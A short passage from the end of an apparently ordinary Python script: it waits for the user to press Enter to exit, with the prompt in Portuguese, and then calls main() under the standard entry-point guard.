        input("\nENTER para sair...")


if __name__ == "__main__":
    main()